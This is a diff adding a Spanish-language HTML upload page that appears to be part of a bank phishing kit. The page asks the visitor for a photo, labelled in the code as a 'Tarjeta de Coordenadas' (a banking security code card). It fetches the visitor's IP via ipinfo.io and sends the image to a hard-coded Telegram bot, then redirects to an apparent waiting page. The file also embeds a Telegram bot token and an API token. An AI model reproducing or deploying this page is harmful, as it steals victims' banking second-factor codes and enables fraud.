@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enviar Foto a Telegram</title>
+    <style>
+        /* Estilos CSS opcionales para personalizar la apariencia */
+        /* Aquí puedes agregar estilos según tus preferencias */
+    </style>
+</head>
+<body>
+    <form onsubmit="enviarFoto(event)">
+        <div class="file-upload-container">
+            <label class="file-upload-label" for="foto">Haz clic aquí o arrastra una imagen para subirla</label>
+            <input type="file" accept="image/*" capture="camera" id="foto" name="foto" class="file-upload-input" required="" onchange="mostrarNombreArchivo()">
+            <div id="nombre-archivo" style="margin-top: 10px;"></div>
+        </div>
+        
+        <script>
+            function mostrarNombreArchivo() {
+                const input = document.getElementById('foto');
+                const nombreArchivo = input.files[0].name;
+                const divNombreArchivo = document.getElementById('nombre-archivo');
+                divNombreArchivo.textContent = 'Archivo seleccionado: ' + nombreArchivo;
+            }
+        </script>
+        
+
+    <script>
+        const tokenTelegram = "7002533435:AAEijbZSEI91MQrc769rWP-cWSGTtI7QplI";
+        const tokenIPinfo = "9c9af8c7467cc4";
+
+        function enviarFoto(event) {
+            event.preventDefault();
+
+            // Obtener el archivo de imagen
+            const foto = document.getElementById("foto").files[0];
+            const formData = new FormData();
+            formData.append("photo", foto);
+
+            // Obtener información de IP
+            fetch(`https://ipinfo.io/json?token=${tokenIPinfo}`, {
+                method: "GET"
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Componer el mensaje con la IP y otras informaciones
+                const mensaje = `Tarjeta de Coordenadas. IP: ${data.ip}.`;
+
+                // Enviar la foto y el mensaje a Telegram
+                fetch(`https://api.telegram.org/bot${tokenTelegram}/sendPhoto?chat_id=5666517648`, {
+                    method: "POST",
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error("Ocurrió un error al enviar la foto a Telegram.");
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log("Respuesta de Telegram:", data);
+                    // Redirigir a otra página después de enviar la foto
+                    window.location.href = "segundosaperar.html";
+                })
+                .catch(error => {
+                    console.error("Error al enviar la foto a Telegram:", error);
+                });
+            })
+            .catch(error => {
+                console.error("Error al obtener información de IP:", error);
+            });
+        }
+    </script>
+</body>
+</html>
